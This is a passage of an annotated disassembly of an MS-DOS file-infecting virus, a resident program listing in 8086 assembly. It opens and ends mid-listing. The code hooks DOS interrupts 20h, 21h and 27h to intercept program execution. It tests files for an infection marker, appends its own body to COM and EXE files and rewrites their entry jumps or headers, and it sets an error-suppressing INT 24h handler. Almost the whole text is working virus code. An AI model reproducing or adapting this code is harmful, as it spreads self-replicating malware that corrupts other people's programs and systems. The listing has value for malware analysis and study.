				;==========================================================================

				SUB_6		PROC	NEAR
     0474  B8 5700				MOV	AX,5700H
     0477  CD 21				INT	21H			; DOS Services  ah=function 57h
										;  get/set file date & time
     0479  0E					PUSH	CS
     047A  1F					POP	DS
     047B  89 8C 00E6				MOV	DS:DATA_62E[SI],CX	; (8981:00E6=22B6H)
     047F  89 94 00E8				MOV	DS:DATA_63E[SI],DX	; (8981:00E8=1174H)
     0483  8B D6				MOV	DX,SI
     0485  83 C2 0D				ADD	DX,0DH
     0488  8B FA				MOV	DI,DX
     048A  B4 3F				MOV	AH,3FH			; '?'
     048C  B9 001C				MOV	CX,1CH
     048F  CD 21				INT	21H			; DOS Services  ah=function 3Fh
										;  read file, cx=bytes, to ds:dx
     0491  81 3D 5A4D				CMP	WORD PTR [DI],5A4DH
     0495  74 73				JE	LOC_39			; Jump if equal
     0497  E8 0181				CALL	SUB_9			; (061B)
     049A  05 0CF5				ADD	AX,0CF5H
     049D  72 26				JC	LOC_RET_37		; Jump if carry Set
     049F  80 3D E9				CMP	BYTE PTR [DI],0E9H
     04A2  75 22				JNE	LOC_38			; Jump if not equal
     04A4  8B 55 01				MOV	DX,DS:DATA_37E[DI]	; (8981:0001=902EH)
     04A7  33 C9				XOR	CX,CX			; Zero register
     04A9  B8 4200				MOV	AX,4200H
     04AC  CD 21				INT	21H			; DOS Services  ah=function 42h
										;  move file ptr, cx,dx=offset
     04AE  8B D7				MOV	DX,DI
     04B0  83 C2 1C				ADD	DX,1CH
     04B3  B4 3F				MOV	AH,3FH			; '?'
     04B5  B9 0003				MOV	CX,3
     04B8  CD 21				INT	21H			; DOS Services  ah=function 3Fh
										;  read file, cx=bytes, to ds:dx
     04BA  E8 00A5				CALL	SUB_7			; (0562)
     04BD  73 07				JNC	LOC_38			; Jump if carry=0
     04BF  2E: C6 84 0155 01			MOV	CS:DATA_76[SI],1	; (8981:0155=0)

     04C5			LOC_RET_37:					;  xref 8981:049D
     04C5  C3					RETN
     04C6			LOC_38:						;  xref 8981:04A2, 04BD
     04C6  E8 0152				CALL	SUB_9			; (061B)
     04C9  89 84 0880				MOV	DATA_85[SI],AX		; (8981:0880=39H)
     04CD  89 94 0882				MOV	DATA_86[SI],DX		; (8981:0882=0)
     04D1  50					PUSH	AX
     04D2  C7 45 03 FFFF			MOV	WORD PTR DS:DATA_39E[DI],0FFFFH	; (8981:0003=0FBFFH)
     04D7  B9 0005				MOV	CX,5
     04DA  B4 40				MOV	AH,40H			; '@'
     04DC  8B D7				MOV	DX,DI
     04DE  CD 21				INT	21H			; DOS Services  ah=function 40h
										;  write file cx=bytes, to ds:dx
     04E0  8B D6				MOV	DX,SI
     04E2  83 C2 05				ADD	DX,5
     04E5  B9 0BF5				MOV	CX,0BF5H
     04E8  B4 40				MOV	AH,40H			; '@'
     04EA  CD 21				INT	21H			; DOS Services  ah=function 40h
										;  write file cx=bytes, to ds:dx
     04EC  B8 4200				MOV	AX,4200H
     04EF  33 C9				XOR	CX,CX			; Zero register
     04F1  33 D2				XOR	DX,DX			; Zero register
     04F3  CD 21				INT	21H			; DOS Services  ah=function 42h
										;  move file ptr, cx,dx=offset
     04F5  C6 05 E9				MOV	BYTE PTR [DI],0E9H
     04F8  58					POP	AX
     04F9  05 00F7				ADD	AX,0F7H
     04FC  89 45 01				MOV	DS:DATA_37E[DI],AX	; (8981:0001=902EH)
     04FF  8B D7				MOV	DX,DI
     0501  B9 0003				MOV	CX,3
     0504  B4 40				MOV	AH,40H			; '@'
     0506  CD 21				INT	21H			; DOS Services  ah=function 40h
										;  write file cx=bytes, to ds:dx
     0508  F8					CLC				; Clear carry flag
     0509  C3					RETN
     050A			LOC_39:						;  xref 8981:0495
     050A  83 7D 0C FF				CMP	WORD PTR DS:DATA_46E[DI],0FFFFH	; (8981:000C=0EB00H)
     050E  75 5F				JNE	LOC_40			; Jump if not equal
     0510  56					PUSH	SI
     0511  8B 75 14				MOV	SI,DS:DATA_47E[DI]	; (8981:0014=206FH)
     0514  8B 4D 16				MOV	CX,DS:DATA_48E[DI]	; (8981:0016=202DH)
     0517  8B C1				MOV	AX,CX
     0519  8A CD				MOV	CL,CH
     051B  32 ED				XOR	CH,CH			; Zero register
     051D  D1 E9				SHR	CX,1			; Shift w/zeros fill
     051F  D1 E9				SHR	CX,1			; Shift w/zeros fill
     0521  D1 E9				SHR	CX,1			; Shift w/zeros fill
     0523  D1 E9				SHR	CX,1			; Shift w/zeros fill
     0525  D1 E0				SHL	AX,1			; Shift w/zeros fill
     0527  D1 E0				SHL	AX,1			; Shift w/zeros fill
     0529  D1 E0				SHL	AX,1			; Shift w/zeros fill
     052B  D1 E0				SHL	AX,1			; Shift w/zeros fill
     052D  03 F0				ADD	SI,AX
     052F  83 D1 00				ADC	CX,0
     0532  83 EE 03				SUB	SI,3
     0535  83 D9 00				SBB	CX,0
     0538  8B 45 08				MOV	AX,WORD PTR DS:DATA_41E+3[DI]	; (8981:0008=4D0CH)
     053B  E8 00CA				CALL	SUB_8			; (0608)
     053E  03 F0				ADD	SI,AX
     0540  13 CA				ADC	CX,DX
     0542  8B D6				MOV	DX,SI
     0544  5E					POP	SI
     0545  B8 4200				MOV	AX,4200H
     0548  CD 21				INT	21H			; DOS Services  ah=function 42h
										;  move file ptr, cx,dx=offset
     054A  8B D7				MOV	DX,DI
     054C  83 C2 1C				ADD	DX,1CH
     054F  B4 3F				MOV	AH,3FH			; '?'
     0551  B9 0003				MOV	CX,3
     0554  CD 21				INT	21H			; DOS Services  ah=function 3Fh
										;  read file, cx=bytes, to ds:dx
     0556  E8 0009				CALL	SUB_7			; (0562)
     0559  73 18				JNC	LOC_43			; Jump if carry=0
     055B  2E: C6 84 0155 01			MOV	CS:DATA_76[SI],1	; (8981:0155=0)
     0561  C3					RETN

				;==== External Entry into Subroutine ======================================
				;         Called from:	 8981:04BA, 0556

				SUB_7:
     0562  81 7D 1C 4756			CMP	WORD PTR COPYRIGHT+4[DI],4756H	; (8981:001C=6972H)
     0567  75 08				JNE	LOC_42			; Jump if not equal
     0569  80 7D 1E 31				CMP	BYTE PTR COPYRIGHT+6[DI],31H	; (8981:001E=67H) '1'
     056D  75 02				JNE	LOC_42			; Jump if not equal
     056F			LOC_40:						;  xref 8981:050E
     056F  F9					STC				; Set carry flag

     0570			LOC_RET_41:					;  xref 8981:0597
     0570  C3					RETN
     0571			LOC_42:						;  xref 8981:0567, 056D
     0571  F8					CLC				; Clear carry flag
     0572  C3					RETN
     0573			LOC_43:						;  xref 8981:0559
     0573  E8 00A5				CALL	SUB_9			; (061B)
     0576  89 84 0880				MOV	DATA_85[SI],AX		; (8981:0880=39H)
     057A  89 94 0882				MOV	DATA_86[SI],DX		; (8981:0882=0)
     057E  8B 4D 04				MOV	CX,WORD PTR DS:DATA_39E+1[DI]	; (8981:0004=0FBH)
     0581  D1 E1				SHL	CX,1			; Shift w/zeros fill
     0583  86 E9				XCHG	CH,CL
     0585  8B E9				MOV	BP,CX
     0587  81 E5 FF00				AND	BP,0FF00H
     058B  32 ED				XOR	CH,CH			; Zero register
     058D  03 6D 06				ADD	BP,WORD PTR DS:DATA_41E+1[DI]	; (8981:0006=0BB01H)
     0590  83 D1 00				ADC	CX,0
     0593  2B E8				SUB	BP,AX
     0595  1B CA				SBB	CX,DX
     0597  72 D7				JC	LOC_RET_41		; Jump if carry Set
     0599  50					PUSH	AX
     059A  52					PUSH	DX
     059B  FF 75 18				PUSH	WORD PTR COPYRIGHT[DI]	; (8981:0018=6F43H)
     059E  C6 45 18 FF				MOV	BYTE PTR COPYRIGHT[DI],0FFH	; (8981:0018=43H)
     05A2  B9 0005				MOV	CX,5
     05A5  B4 40				MOV	AH,40H			; '@'
     05A7  8B D7				MOV	DX,DI
     05A9  83 C2 14				ADD	DX,14H
     05AC  CD 21				INT	21H			; DOS Services  ah=function 40h
										;  write file cx=bytes, to ds:dx
     05AE  8F 45 18				POP	WORD PTR COPYRIGHT[DI]	; (8981:0018=6F43H)
     05B1  8B D6				MOV	DX,SI
     05B3  83 C2 05				ADD	DX,5
     05B6  B9 0BF5				MOV	CX,0BF5H
     05B9  B4 40				MOV	AH,40H			; '@'
     05BB  CD 21				INT	21H			; DOS Services  ah=function 40h
										;  write file cx=bytes, to ds:dx
     05BD  B8 4200				MOV	AX,4200H
     05C0  33 C9				XOR	CX,CX			; Zero register
     05C2  33 D2				XOR	DX,DX			; Zero register
     05C4  CD 21				INT	21H			; DOS Services  ah=function 42h
										;  move file ptr, cx,dx=offset
     05C6  8F 45 16				POP	WORD PTR DS:DATA_48E[DI]	; (8981:0016=202DH)
     05C9  8F 45 14				POP	WORD PTR DS:DATA_47E[DI]	; (8981:0014=206FH)
     05CC  81 45 14 00FA			ADD	WORD PTR DS:DATA_47E[DI],0FAH	; (8981:0014=206FH)
     05D1  83 55 16 00				ADC	WORD PTR DS:DATA_48E[DI],0	; (8981:0016=202DH)
     05D5  8B 45 08				MOV	AX,WORD PTR DS:DATA_41E+3[DI]	; (8981:0008=4D0CH)
     05D8  E8 002D				CALL	SUB_8			; (0608)
     05DB  29 45 14				SUB	DS:DATA_47E[DI],AX	; (8981:0014=206FH)
     05DE  19 55 16				SBB	DS:DATA_48E[DI],DX	; (8981:0016=202DH)
     05E1  B1 0C				MOV	CL,0CH
     05E3  D3 65 16				SHL	WORD PTR DS:DATA_48E[DI],CL	; (8981:0016=202DH) Shift w/zeros fill
     05E6  B8 0BFA				MOV	AX,0BFAH
     05E9  03 45 02				ADD	AX,WORD PTR DS:DATA_37E+1[DI]	; (8981:0002=0FF90H)
     05EC  89 45 02				MOV	WORD PTR DS:DATA_37E+1[DI],AX	; (8981:0002=0FF90H)
     05EF  81 65 02 01FF			AND	WORD PTR DS:DATA_37E+1[DI],1FFH	; (8981:0002=0FF90H)
     05F4  8A C4				MOV	AL,AH
     05F6  32 E4				XOR	AH,AH			; Zero register
     05F8  D1 E8				SHR	AX,1			; Shift w/zeros fill
     05FA  01 45 04				ADD	WORD PTR DS:DATA_39E+1[DI],AX	; (8981:0004=0FBH)
     05FD  8B D7				MOV	DX,DI
     05FF  B9 001C				MOV	CX,1CH
     0602  B4 40				MOV	AH,40H			; '@'
     0604  CD 21				INT	21H			; DOS Services  ah=function 40h
										;  write file cx=bytes, to ds:dx
     0606  F8					CLC				; Clear carry flag
     0607  C3					RETN
				SUB_6		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:053B, 05D8
				;==========================================================================

				SUB_8		PROC	NEAR
     0608  33 D2				XOR	DX,DX			; Zero register
     060A  D1 E0				SHL	AX,1			; Shift w/zeros fill
     060C  D1 D2				RCL	DX,1			; Rotate thru carry
     060E  D1 E0				SHL	AX,1			; Shift w/zeros fill
     0610  D1 D2				RCL	DX,1			; Rotate thru carry
     0612  D1 E0				SHL	AX,1			; Shift w/zeros fill
     0614  D1 D2				RCL	DX,1			; Rotate thru carry
     0616  D1 E0				SHL	AX,1			; Shift w/zeros fill
     0618  D1 D2				RCL	DX,1			; Rotate thru carry
     061A  C3					RETN
				SUB_8		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:0497, 04C6, 0573
				;==========================================================================

				SUB_9		PROC	NEAR
     061B  33 D2				XOR	DX,DX			; Zero register
     061D  33 C9				XOR	CX,CX			; Zero register
     061F  B8 4202				MOV	AX,4202H
     0622  CD 21				INT	21H			; DOS Services  ah=function 42h
										;  move file ptr, cx,dx=offset
     0624  C3					RETN
				SUB_9		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:011A, 0369
				;==========================================================================

				SUB_10		PROC	NEAR
     0625  33 C0				XOR	AX,AX			; Zero register
     0627  8E D8				MOV	DS,AX
     0629  C5 3E 009C				LDS	DI,DWORD PTR DS:DATA_15E	; (0000:009C=180BH) Load 32 bit ptr
     062D  C5 7D 01				LDS	DI,DWORD PTR DS:DATA_33E[DI]	; (10A8:0001=0A920H) Load 32 bit ptr
     0630  8B C7				MOV	AX,DI
     0632  81 EF 075F				SUB	DI,75FH
     0636  E8 0029				CALL	SUB_11			; (0662)
     0639  74 26				JZ	LOC_RET_44		; Jump if zero
     063B  8B F8				MOV	DI,AX
     063D  81 EF 0755				SUB	DI,755H
     0641  E8 001E				CALL	SUB_11			; (0662)
     0644  74 1B				JZ	LOC_RET_44		; Jump if zero
     0646  C5 3E 0080				LDS	DI,DWORD PTR DS:DATA_32E	; (0652:0080=8A03H) Load 32 bit ptr
     064A  C5 7D 01				LDS	DI,DWORD PTR DS:DATA_34E[DI]	; (1F05:0001=0) Load 32 bit ptr
     064D  8B C7				MOV	AX,DI
     064F  81 EF 0676				SUB	DI,676H
     0653  E8 000C				CALL	SUB_11			; (0662)
     0656  74 09				JZ	LOC_RET_44		; Jump if zero
     0658  8B F8				MOV	DI,AX
     065A  81 EF 0673				SUB	DI,673H
     065E  E8 0001				CALL	SUB_11			; (0662)

     0661			LOC_RET_44:					;  xref 8981:0639, 0644, 0656
     0661  C3					RETN
				SUB_10		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:0636, 0641, 0653, 065E
				;==========================================================================

				SUB_11		PROC	NEAR
     0662  33 D2				XOR	DX,DX			; Zero register
     0664  81 3D 4756				CMP	WORD PTR [DI],4756H
     0668  75 06				JNE	LOC_45			; Jump if not equal
     066A  80 7D 02 31				CMP	BYTE PTR DS:DATA_31E[DI],31H	; (0652:0002=9) '1'
     066E  74 01				JE	LOC_46			; Jump if equal
     0670			LOC_45:						;  xref 8981:0668
     0670  42					INC	DX
     0671			LOC_46:						;  xref 8981:066E
     0671  81 EF 00F7				SUB	DI,0F7H
     0675  0B D2				OR	DX,DX			; Zero ?
     0677  C3					RETN
				SUB_11		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:0695, 069B, 06A1, 06A7, 071B, 0721, 0727
				;==========================================================================

				SUB_12		PROC	NEAR
     0678  B0 EA				MOV	AL,0EAH
     067A  AA					STOSB				; Store al to es:[di]
     067B  8B C1				MOV	AX,CX
     067D  03 C6				ADD	AX,SI
     067F  AB					STOSW				; Store ax to es:[di]
     0680  8C C8				MOV	AX,CS
     0682  AB					STOSW				; Store ax to es:[di]

     0683			LOC_RET_47:					;  xref 8981:0686
     0683  C3					RETN
				SUB_12		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:03AB
				;==========================================================================

				SUB_13		PROC	NEAR
     0684  0B D2				OR	DX,DX			; Zero ?
     0686  74 FB				JZ	LOC_RET_47		; Jump if zero
     0688  1E					PUSH	DS
     0689  06					PUSH	ES
     068A  8E 84 00E0				MOV	ES,DS:DATA_58E[SI]	; (8981:00E0=0AEBH)
     068E  BF 00EC				MOV	DI,0ECH
     0691  FC					CLD				; Clear direction
     0692  B9 09A8				MOV	CX,9A8H
     0695  E8 FFE0				CALL	SUB_12			; (0678)
     0698  B9 076A				MOV	CX,76AH
     069B  E8 FFDA				CALL	SUB_12			; (0678)
     069E  B9 07BE				MOV	CX,7BEH
     06A1  E8 FFD4				CALL	SUB_12			; (0678)
     06A4  B9 084C				MOV	CX,84CH
     06A7  E8 FFCE				CALL	SUB_12			; (0678)
     06AA  33 C0				XOR	AX,AX			; Zero register
     06AC  8E D8				MOV	DS,AX
     06AE  FA					CLI				; Disable interrupts
     06AF  B8 00EC				MOV	AX,0ECH
     06B2  87 06 0070				XCHG	AX,DS:DATA_7E		; (0000:0070=0FBCH)
     06B6  2E: 89 84 0A88			MOV	WORD PTR CS:[0A88H][SI],AX	; (8981:0A88=0FF53H)
     06BB  8C C0				MOV	AX,ES
     06BD  87 06 0072				XCHG	AX,DS:DATA_8E		; (0000:0072=10A8H)
     06C1  2E: 89 84 0A8A			MOV	WORD PTR CS:[0A8AH][SI],AX	; (8981:0A8A=0F000H)
     06C6  B8 00F1				MOV	AX,0F1H
     06C9  87 06 0080				XCHG	AX,DS:DATA_9E		; (0000:0080=143FH)
     06CD  2E: 89 84 076E			MOV	CS:DATA_77[SI],AX	; (8981:076E=136CH)
     06D2  8C C0				MOV	AX,ES
     06D4  87 06 0082				XCHG	AX,DS:DATA_10E		; (0000:0082=279H)
     06D8  2E: 89 84 0770			MOV	CS:DATA_78[SI],AX	; (8981:0770=291H)
     06DD  B8 00F6				MOV	AX,0F6H
     06E0  87 06 0084				XCHG	AX,DS:DATA_11E		; (0000:0084=1230H)
     06E4  2E: 89 84 07DC			MOV	WORD PTR CS:[7DCH][SI],AX	; (8981:07DC=138DH)
     06E9  8C C0				MOV	AX,ES
     06EB  87 06 0086				XCHG	AX,DS:DATA_12E		; (0000:0086=10A8H)
     06EF  2E: 89 84 07DE			MOV	WORD PTR CS:[7DEH][SI],AX	; (8981:07DE=291H)
     06F4  B8 00FB				MOV	AX,0FBH
     06F7  87 06 009C				XCHG	AX,DS:DATA_15E		; (0000:009C=180BH)
     06FB  2E: 89 84 0857			MOV	WORD PTR CS:[857H][SI],AX	; (8981:0857=5DFEH)
     0700  8C C0				MOV	AX,ES
     0702  87 06 009E				XCHG	AX,WORD PTR DS:DATA_15E+2	; (0000:009E=10A8H)
     0706  2E: 89 84 0859			MOV	WORD PTR CS:[859H][SI],AX	; (8981:0859=291H)
     070B  07					POP	ES
     070C  1F					POP	DS
     070D  FB					STI				; Enable interrupts
     070E  C3					RETN
				SUB_13		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:07A9
				;==========================================================================

				SUB_14		PROC	NEAR
     070F  06					PUSH	ES
     0710  8E 84 00E0				MOV	ES,DS:DATA_23E[SI]	; (01E0:00E0=2EF4H)
     0714  BF 00F1				MOV	DI,0F1H
     0717  FC					CLD				; Clear direction
     0718  B9 076D				MOV	CX,76DH
     071B  E8 FF5A				CALL	SUB_12			; (0678)
     071E  B9 07E0				MOV	CX,7E0H
     0721  E8 FF54				CALL	SUB_12			; (0678)
     0724  B9 0856				MOV	CX,856H
     0727  E8 FF4E				CALL	SUB_12			; (0678)
     072A  07					POP	ES
     072B  C3					RETN
				SUB_14		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:0101, 07EF
				;==========================================================================

				SUB_15		PROC	NEAR
     072C  06					PUSH	ES
     072D  33 C0				XOR	AX,AX			; Zero register
     072F  8E C0				MOV	ES,AX
     0731  B8 085B				MOV	AX,85BH
     0734  03 C6				ADD	AX,SI
     0736  26: 87 06 0090			XCHG	AX,ES:DATA_13E		; (0000:0090=556H)
     073B  89 84 00EA				MOV	DS:DATA_25E[SI],AX	; (01E0:00EA=2945H)
     073F  8C C8				MOV	AX,CS
     0741  26: 87 06 0092			XCHG	AX,ES:DATA_14E		; (0000:0092=1FE7H)
     0746  89 84 00EC				MOV	DS:DATA_26E[SI],AX	; (01E0:00EC=1)
     074A  07					POP	ES
     074B  C6 84 00EE 00			MOV	BYTE PTR DS:DATA_27E[SI],0	; (01E0:00EE=74H)
     0750  C3					RETN
				SUB_15		ENDP

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:0350, 0838
				;==========================================================================

				SUB_16		PROC	NEAR
     0751  06					PUSH	ES
     0752  33 C0				XOR	AX,AX			; Zero register
     0754  8E C0				MOV	ES,AX
     0756  2E: 8B 84 00EA			MOV	AX,CS:DATA_64E[SI]	; (8981:00EA=4EBH)
     075B  26: A3 0090				MOV	ES:DATA_13E,AX		; (0000:0090=556H)
     075F  2E: 8B 84 00EC			MOV	AX,CS:DATA_65E[SI]	; (8981:00EC=0A17H)
     0764  26: A3 0092				MOV	ES:DATA_14E,AX		; (0000:0092=1FE7H)
     0768  07					POP	ES
     0769  C3					RETN
				SUB_16		ENDP

                                                |-----------------------------------------------------
     -------------------------------------------| INT 20        ->      CS:076A  (jmp far from ....
                                                |-----------------------------------------------------
     076A .EB 35				JMP	SHORT LOC_50		; (07A1)
     076C  90 EA				DB	 90H,0EAH
     076E  136C			DATA_77		DW	136CH			; Data table (indexed access)
										;  xref 8981:06CD
     0770  0291			DATA_78		DW	291H			; Data table (indexed access)
										;  xref 8981:06D8

				;==========================================================================
				;			       SUBROUTINE
				;         Called from:	 8981:00FE, 0782, 07A3, 07EC
				;==========================================================================

				SUB_17		PROC	NEAR
     0772  5B					POP	BX
     0773  1E					PUSH	DS
     0774  50					PUSH	AX
     0775  1E					PUSH	DS
     0776  0E					PUSH	CS
     0777  1F					POP	DS
     0778  E8 0000				CALL	SUB_18			; (077B)

				;==== External Entry into Subroutine ======================================
				;         Called from:	 8981:0778

				SUB_18:
     077B  5E					POP	SI
     077C  81 EE 077B				SUB	SI,77BH
     0780  FF E3				JMP	BX			; Register jump
     0782			LOC_48:						;  xref 8981:07CF, 07D4
     0782  E8 FFED				CALL	SUB_17			; (0772)
     0785  51					PUSH	CX
     0786  8B 44 07				MOV	AX,DS:DATA_22E[SI]	; (01E0:0007=1F02H)
     0789  8C C1				MOV	CX,ES
     078B  3B C1				CMP	AX,CX
     078D  59					POP	CX
     078E  1F					POP	DS
     078F  58					POP	AX
     0790  75 0B				JNZ	LOC_49			; Jump if not zero
     0792  0E					PUSH	CS
     0793  07					POP	ES
     0794  80 FC 49				CMP	AH,49H			; 'I'
     0797  74 04				JE	LOC_49			; Jump if equal
     0799  81 C3 01D0				ADD	BX,1D0H
     079D			LOC_49:						;  xref 8981:0790, 0797
     079D  1F					POP	DS
     079E  EB 3B				JMP	SHORT LOC_52		; (07DB)
     07A0  90					DB	90H
     07A1			LOC_50:						;  xref 8981:076A, 07C1, 07CA
     07A1  33 D2				XOR	DX,DX			; Zero register
     07A3			LOC_51:						;  xref 8981:07C6, 0853
     07A3  E8 FFCC				CALL	SUB_17			; (0772)
     07A6  06					PUSH	ES
     07A7  52					PUSH	DX
     07A8  FA					CLI				; Disable interrupts
     07A9  E8 FF63				CALL	SUB_14			; (070F)
     07AC  FB					STI				; Enable interrupts
     07AD  58					POP	AX
     07AE  BA 01D0				MOV	DX,1D0H
     07B1  03 D0				ADD	DX,AX
     07B3  83 C2 10				ADD	DX,10H
     07B6  07					POP	ES
     07B7  1F					POP	DS
     07B8  58					POP	AX
     07B9  1F					POP	DS
     07BA  B4 31				MOV	AH,31H			; '1'
     07BC  EB 1D				JMP	SHORT LOC_52		; (07DB)

                                                |-----------------------------------------------------
     -------------------------------------------| INT 21        ->      CS:07BE  (jmp far from ....
                                                |-----------------------------------------------------
     07BE  80 FC 4C				CMP	AH,4CH			; 'L'
     07C1  74 DE				JE	LOC_50			; Jump if equal
     07C3  80 FC 31				CMP	AH,31H			; '1'
     07C6  74 DB				JE	LOC_51			; Jump if equal
     07C8  0A E4				OR	AH,AH			; Zero ?
     07CA  74 D5				JZ	LOC_50			; Jump if zero
     07CC  80 FC 49				CMP	AH,49H			; 'I'
     07CF  74 B1				JE	LOC_48			; Jump if equal
     07D1  80 FC 4A				CMP	AH,4AH			; 'J'
     07D4  74 AC				JE	LOC_48			; Jump if equal
     07D6  80 FC 4B				CMP	AH,4BH			; 'K'
     07D9  74 0A				JE	LOC_53			; Jump if equal
     07DB			LOC_52:						;  xref 8981:079E, 07BC, 07E3, 084A
     07DB  EA 0291:138D		;*		JMP	FAR PTR LOC_1		; (0291:138D)

                                                |-------------------------------------------
     -------------------------------------------|
                                                |-------------------------------------------
     07E0 .80 FC 4B				CMP	AH,4BH			; 'K'
     07E3  75 F6				JNE	LOC_52			; Jump if not equal
     07E5			LOC_53:						;  xref 8981:07D9
     07E5  51					PUSH	CX
     07E6  52					PUSH	DX
     07E7  06					PUSH	ES
     07E8  53					PUSH	BX
     07E9  56					PUSH	SI
     07EA  57					PUSH	DI
     07EB  55					PUSH	BP
     07EC  E8 FF83				CALL	SUB_17			; (0772)
     07EF  E8 FF3A				CALL	SUB_15			; (072C)
     07F2			LOC_54:						;  xref 8981:07F8, 0800
     07F2  FB					STI				; Enable interrupts
     07F3  F6 06 0972 02			TEST	BYTE PTR DS:DATA_30E,2	; (01E0:0972=0)
     07F8  75 F8				JNZ	LOC_54			; Jump if not zero
     07FA  FA					CLI				; Disable interrupts
     07FB  F6 06 0972 02			TEST	BYTE PTR DS:DATA_30E,2	; (01E0:0972=0)
     0800  75 F0				JNZ	LOC_54			; Jump if not zero
     0802  80 0E 0972 02			OR	BYTE PTR DS:DATA_30E,2	; (01E0:0972=0)
     0807  1F					POP	DS
     0808  8B DA				MOV	BX,DX
     080A  2E: C6 84 00E2 FF			MOV	BYTE PTR CS:DATA_59E[SI],0FFH	; (8981:00E2=2)
     0810  80 7F 01 3A				CMP	BYTE PTR DS:DATA_1E[BX],3AH	; (0000:0001=56H) ':'
     0814  75 0B				JNE	LOC_55			; Jump if not equal
     0816  8A 07				MOV	AL,[BX]
     0818  0C 20				OR	AL,20H			; ' '
     081A  2C 61				SUB	AL,61H			; 'a'
     081C  2E: 88 84 00E2			MOV	CS:DATA_59E[SI],AL	; (8981:00E2=2)
     0821			LOC_55:						;  xref 8981:0814
     0821  56					PUSH	SI
     0822  57					PUSH	DI
     0823  06					PUSH	ES
     0824  FC					CLD				; Clear direction
     0825  8B F2				MOV	SI,DX
     0827  0E					PUSH	CS
     0828  07					POP	ES
     0829  BF 0984				MOV	DI,984H
     082C			LOC_56:						;  xref 8981:0830
     082C  AC					LODSB				; String [si] to al
     082D  AA					STOSB				; Store al to es:[di]
     082E  0A C0				OR	AL,AL			; Zero ?
     0830  75 FA				JNZ	LOC_56			; Jump if not zero
     0832  07					POP	ES
     0833  5F					POP	DI
     0834  5E					POP	SI
     0835  E8 FBED				CALL	SUB_5			; (0425)
     0838  E8 FF16				CALL	SUB_16			; (0751)
     083B  2E: 80 26 0972 FD			AND	BYTE PTR CS:[972H],0FDH	; (8981:0972=0F3H)
     0841  58					POP	AX
     0842  1F					POP	DS
     0843  5D					POP	BP
     0844  5F					POP	DI
     0845  5E					POP	SI
     0846  5B					POP	BX
     0847  07					POP	ES
     0848  5A					POP	DX
     0849  59					POP	CX
     084A  EB 8F				JMP	SHORT LOC_52		; (07DB)
				SUB_17		ENDP

                                                |-----------------------------------------------------
     -------------------------------------------| INT 27        ->      CS:084C  (jmp far from ....
                                                |-----------------------------------------------------
     084C  83 C2 0F				ADD	DX,0FH
     084F  B1 04				MOV	CL,4
     0851  D3 EA				SHR	DX,CL			; Shift w/zeros fill
     0853  E9 FF4D				JMP	LOC_51			; (07A3)
     0856  EA 0291:5DFE		;*		JMP	FAR PTR LOC_2		; (0291:5DFE)


     085B .56					PUSH	SI
     085C  E8 0000				CALL	SUB_19			; (085F)

     085F  5E					POP	SI
     0860  81 EE 085F				SUB	SI,85FH
     0864  2E: 80 8C 00EE 01			OR	BYTE PTR CS:DATA_66E[SI],1	; (8981:00EE=0)
     086A  5E					POP	SI
     086B  32 C0				XOR	AL,AL			; Zero register
     086D  CF					IRET				; Interrupt return
				SUB_19		ENDP

     086E  01 00 00 00				DB	1, 0, 0, 0
     0872  82			DATA_83		DB	82H			; Data table (indexed access)
										;  xref 8981:013A, 016D, 0189, 01E9
     0873  00 00 00 00				DB	0, 0, 0, 0
     0877  FFDC			DATA_84		DW	0FFDCH			; Data table (indexed access)
										;  xref 8981:0167
     0879  00 00 00 00 B8 00			DB	 00H, 00H, 00H, 00H,0B8H, 00H
     087F  00					DB	 00H
     0880  0039			DATA_85		DW	39H			; Data table (indexed access)
										;  xref 8981:01D3, 04C9, 0576
     0882  0000			DATA_86		DW	0			; Data table (indexed access)
										;  xref 8981:01D7, 04CD, 057A
     0884  3A43			DATA_87		DW	3A43H			; Data table (indexed access)
										;  xref 8981:03F5
     0886  5C 33 30 36 36 5C	DATA_88		DB	'\3066\HELLO.COM', 0	; Data table (indexed access)
										;  xref 8981:03F9
     088C  48 45 4C 4C 4F 2E
     0892  43 4F 4D 00
     0896  45 58 45 00 45 00			DB	 45H, 58H, 45H, 00H, 45H, 00H
     089C  008F[00]				DB	143 DUP (0)

     092B			LOC_57:						;  xref 8981:09A6
     092B  51					PUSH	CX
     092C  1E					PUSH	DS
     092D  06					PUSH	ES
     092E  56					PUSH	SI
     092F  57					PUSH	DI
     0930  0E					PUSH	CS
     0931  07					POP	ES
     0932  FC					CLD				; Clear direction
     0933  A8 20				TEST	AL,20H			; ' '
     0935  74 56				JZ	LOC_60			; Jump if zero
     0937  A8 02				TEST	AL,2
     0939  75 63				JNZ	LOC_61			; Jump if not zero
     093B  33 C0				XOR	AX,AX			; Zero register
     093D  8E D8				MOV	DS,AX
     093F  A0 0449				MOV	AL,DS:DATA_21E		; (0000:0449=3)
     0942  B9 B800				MOV	CX,0B800H
     0945  3C 07				CMP	AL,7
     0947  75 05				JNE	LOC_58			; Jump if not equal
     0949  B9 B000				MOV	CX,0B000H
     094C  EB 08				JMP	SHORT LOC_59		; (0956)
     094E			LOC_58:						;  xref 8981:0947
     094E  3C 02				CMP	AL,2
     0950  74 04				JE	LOC_59			; Jump if equal
     0952  3C 03				CMP	AL,3
     0954  75 48				JNE	LOC_61			; Jump if not equal
     0956			LOC_59:						;  xref 8981:094C, 0950
     0956  2E: 89 0E 097C			MOV	WORD PTR CS:[97CH],CX	; (8981:097C=2406H)
     095B  2E: 80 0E 0972 02			OR	BYTE PTR CS:[972H],2	; (8981:0972=0F3H)
     0961  2E: C7 06 097E 0000			MOV	WORD PTR CS:[97EH],0	; (8981:097E=2E00H)
     0968  8E D9				MOV	DS,CX
     096A  B9 07D0				MOV	CX,7D0H
     096D  33 F6				XOR	SI,SI			; Zero register
     096F  BF 0CF5				MOV	DI,0CF5H
     0972  F3/ A5				REP	MOVSW			; Rep when cx >0 Mov [si] to es:[di]
     0974  33 C0				XOR	AX,AX			; Zero register
     0976  8E D8				MOV	DS,AX
     0978  B8 0B92				MOV	AX,0B92H
